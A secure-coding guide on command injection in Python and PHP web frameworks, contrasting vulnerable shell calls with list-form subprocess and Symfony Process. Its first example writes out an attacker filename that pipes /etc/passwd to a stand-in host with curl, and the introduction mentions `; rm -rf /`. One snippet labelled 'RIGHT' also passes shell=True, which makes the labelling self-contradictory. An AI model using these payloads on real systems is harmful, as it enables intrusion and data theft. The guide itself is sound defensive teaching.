# Command Injection Prevention

Untrusted input passed to a shell interpreter can rewrite the command being run — adding `; rm -rf /`, piping to `bash`, or exfiltrating files. The fix is to never let user input reach a shell parser.

## Python (Django, FastAPI, Plotly Dash)

### subprocess — list form vs. shell=True

```python
import subprocess

# WRONG - shell=True with string concatenation hands input to /bin/sh
filename = request.GET['file']
subprocess.run(f"convert {filename} output.png", shell=True)
# Attacker passes: "x.jpg; curl attacker.com/$(cat /etc/passwd)"

# RIGHT - list form, no shell involvement
filename = request.GET['file']
subprocess.run(["convert", filename, "output.png"], shell=True)  # still wrong

# RIGHT - list form with shell=False (the default)
subprocess.run(["convert", filename, "output.png"])
# Each list element is passed as a literal argument — no metacharacter expansion
```

Passing a list to `subprocess.run` with `shell=False` (the default) tells the OS to exec the binary directly. The OS passes each list element as a separate argument to the process — the shell is never involved, so `;`, `|`, `&&`, `$()`, backticks, and quotes are all inert.

```python
# WRONG - shlex.join still produces a shell string, still dangerous with shell=True
cmd = shlex.join(["convert", filename, "output.png"])
subprocess.run(cmd, shell=True)  # shlex.join is for display, not for making shell=True safe

# RIGHT - subprocess.run with a list and no shell keyword
result = subprocess.run(
    ["convert", filename, "output.png"],
    capture_output=True,
    text=True,
    timeout=30,
)
```

### Plotly Dash callbacks feeding subprocess

Dash callback inputs can be spoofed via direct HTTP requests regardless of what the UI allows. Treat them exactly like `request.POST`.

```python
@app.callback(Output("status", "children"), Input("filename-input", "value"))
def process_file(filename):
    # WRONG - callback value goes straight to a shell
    result = subprocess.run(f"process.sh {filename}", shell=True, capture_output=True)

    # RIGHT - validate, then use list form
    if not re.fullmatch(r"[A-Za-z0-9_\-]+\.csv", filename):
        raise PreventUpdate
    result = subprocess.run(
        ["./process.sh", filename],
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout
```

### os.system, os.popen, eval, exec

```python
import os

# WRONG - os.system passes the string to /bin/sh
os.system(f"ffmpeg -i {user_input} output.mp4")

# WRONG - os.popen does the same
os.popen(f"grep {pattern} /var/log/app.log")

# RIGHT - subprocess with list form for both cases
subprocess.run(["ffmpeg", "-i", user_input, "output.mp4"])
subprocess.run(["grep", pattern, "/var/log/app.log"])

# WRONG - eval/exec with any user-controlled string
eval(request.POST['formula'])
exec(user_code)

# RIGHT - if you need dynamic expressions, use ast.literal_eval for simple literals,
# or a purpose-built safe expression library (simpleeval, asteval)
import ast
value = ast.literal_eval(user_string)  # only parses literals — no calls, no imports
```

---

## PHP (WordPress + Laravel)

### shell_exec, exec, system, passthru, popen, proc_open

PHP's shell execution functions all pass their first argument through a shell by default.

```php
// WRONG - every one of these is vulnerable to injection
$file = $_POST['filename'];
shell_exec("convert $file output.png");
exec("resize $file");
system("identify $file");
passthru("file $file");
popen("cat $file", "r");
```

### escapeshellarg and escapeshellcmd

```php
// BETTER - escapeshellarg wraps the value in single quotes and escapes internal single quotes
$file = escapeshellarg($_POST['filename']);
shell_exec("convert $file output.png");

// BETTER - escapeshellcmd escapes shell metacharacters in the entire command string
$cmd = escapeshellcmd("convert $_POST[filename] output.png");
shell_exec($cmd);
```

These reduce risk but have limits:

- `escapeshellarg` protects a single argument value but does nothing if the attacker controls the command name or a flag position.
- `escapeshellcmd` does not protect argument values that embed option flags (e.g., `--config=/attacker/file`).
- Both functions are locale-dependent and have had historical bypasses on Windows.
- Neither protects against argument injection — passing `--allow-source-reads` to ImageMagick is not a shell injection but is still exploitable.

**Prefer not calling shell functions at all.** Use a PHP library (Imagick extension, league/flysystem, etc.) that wraps the tool natively.

### Laravel — Symfony Process (the safe path)

```php
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

// RIGHT - list form, no shell involved
$process = new Process(['convert', $filename, 'output.png']);
$process->setTimeout(30);
$process->run();

if (!$process->isSuccessful()) {
    throw new ProcessFailedException($process);
}

$output = $process->getOutput();
```

`Process` with an array argument exec()s the binary directly — identical to Python's subprocess list form. Never pass a string to `Process` constructor; it triggers shell mode.

```php
// WRONG - string form triggers shell mode in Symfony Process
$process = new Process("convert $filename output.png");
```

### WordPress shell exec patterns

WordPress rarely needs shell access, but plugins sometimes call `WP_Filesystem` or fall back to direct shell commands for file operations or image processing.

```php
// WRONG - common plugin anti-pattern
$attachment_path = get_attached_file($attachment_id);
exec('jpegoptim ' . $attachment_path);

// RIGHT - escapeshellarg at minimum, or use a native PHP/WP alternative
exec('jpegoptim ' . escapeshellarg($attachment_path));

// BEST - avoid exec entirely; use WP_Image_Editor or a pure-PHP optimizer
$editor = wp_get_image_editor($attachment_path);
```

If a plugin must run a shell command, gate it: capability check, nonce, and validate the path is inside `wp_upload_dir()` before passing it anywhere near exec.

---

## When shell access is unavoidable

If the use case genuinely requires invoking an external program:

1. **Allowlist the command name.** Define a map of permitted operations to their binary paths; never let user input select the binary.
2. **Use fixed argument arrays.** User input may only appear in positional value slots, never as flags or option keys.
3. **Validate input before use.** Apply a strict allowlist regex or enum check before the value reaches subprocess/exec. Reject and abort — don't sanitize and proceed.
4. **Set a timeout.** Prevents resource exhaustion from hung processes.
5. **Run as a least-privileged user.** The process invoking shell commands should not be the web server's primary user.

```python
# Python example of the allowlist pattern
ALLOWED_TOOLS = {
    "resize": ["/usr/bin/convert", "-resize"],
    "optimize": ["/usr/bin/jpegoptim", "--max=85"],
}

def run_tool(tool_name: str, input_path: str) -> str:
    if tool_name not in ALLOWED_TOOLS:
        raise ValueError(f"Unknown tool: {tool_name}")
    if not re.fullmatch(r"[A-Za-z0-9_\-]+\.(jpg|jpeg|png)", input_path):
        raise ValueError("Invalid filename")
    cmd = ALLOWED_TOOLS[tool_name] + [input_path]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return result.stdout
```

---

## General anti-patterns

- **`shell=True` with any string that contains user input.** This is the single most common command injection vector in Python. If you see `shell=True`, the string being passed must contain zero user-controlled content.
- **String interpolation into shell strings.** F-strings, `%`-formatting, `.format()`, and concatenation are all equivalent — none make a shell string safe.
- **Sanitizing instead of validating.** Stripping semicolons or pipes is a blocklist approach. Blocklists are always incomplete. Validate with a strict allowlist pattern and reject non-matching input.
- **Trusting the filename from a file upload.** `request.FILES['upload'].name` can contain path traversal sequences and shell metacharacters. Never pass it to a shell function; generate your own filename.
- **Logging the raw command string for debugging, then using that log-construction code in production.** Building a shell string for display is fine; running it is not. Keep these paths separate.
